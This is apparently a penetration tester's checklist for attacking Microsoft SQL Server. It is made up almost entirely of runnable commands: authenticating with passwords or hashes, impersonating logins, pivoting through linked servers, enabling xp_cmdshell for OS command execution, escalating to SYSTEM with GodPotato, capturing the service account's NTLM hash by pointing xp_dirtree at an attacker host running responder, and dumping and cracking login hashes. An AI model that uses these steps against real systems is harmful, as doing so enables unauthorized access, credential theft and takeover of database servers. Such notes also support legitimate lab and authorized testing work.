# MSSQL enumeration

## Which login works
A SQL login such as sa needs --local-auth, a Windows or domain account goes without it.
nxc mssql <TargetIP> -u '<Username>' -p '<Password>' --local-auth
nxc mssql <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
nxc mssql <TargetIP> -d <Domain> -u '<Username>' -H <Hash>
- [ ] sa with an empty or default password tried
- [ ] (Pwn3d!) means sysadmin: xp_cmdshell is open to me

## Connect
impacket-mssqlclient '<Username>:<Password>@<TargetIP>'
impacket-mssqlclient '<Domain>/<Username>:<Password>@<TargetIP>' -windows-auth
impacket-mssqlclient '<Domain>/<Username>@<TargetIP>' -hashes :<Hash> -windows-auth
impacket-mssqlclient '<Domain>/<Username>:<Password>@<TargetIP>' -windows-auth -db <Database>

## Who I am and what is here
SELECT @@version;
SELECT SYSTEM_USER, USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
- [ ] 1 means sysadmin
enum_db
enum_logins
USE <Database>;
SELECT table_name FROM information_schema.tables;
SELECT * FROM <Table>;
- [ ] Users and passwords in the application's tables, each tried on every other service

## Impersonation
enum_impersonate
- [ ] A login I may impersonate, best of all sa or another sysadmin
exec_as_login <TargetUser>
Or in plain SQL:
EXECUTE AS LOGIN = '<TargetUser>';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');

## Linked servers
enum_links
- [ ] THE-LINKED-SERVER is a link's name from that list
EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [THE-LINKED-SERVER];
use_link [THE-LINKED-SERVER]
- [ ] sysadmin on the far side: enable_xp_cmdshell there, through use_link
- [ ] A link back to the first server can come in as a stronger login

## Commands through xp_cmdshell
enable_xp_cmdshell
xp_cmdshell whoami /priv
Without the impacket helper, as plain SQL:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
- [ ] It runs as the service account, often with SeImpersonatePrivilege: godpotato's GodPotato-NET4.exe for SYSTEM
- [ ] Tools fetched with the line serve files gives, run through xp_cmdshell: :Pb file-transfer
- [ ] A reverse shell from here: :Pb shells

## The service account's hash
sudo responder -I tun0
xp_dirtree \\<LHOST>\share
Or in plain SQL:
EXEC master..xp_dirtree '\\<LHOST>\share';
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
- [ ] Not cracked: relay it to a host with signing:False instead

## SQL login hashes
As sysadmin:
SELECT name, password_hash FROM sys.sql_logins;
hashcat -m 1731 mssql.hash /usr/share/wordlists/rockyou.txt
- [ ] A master.mdf from a backup or a file read holds the same hashes: Get-MDFHashes takes them out
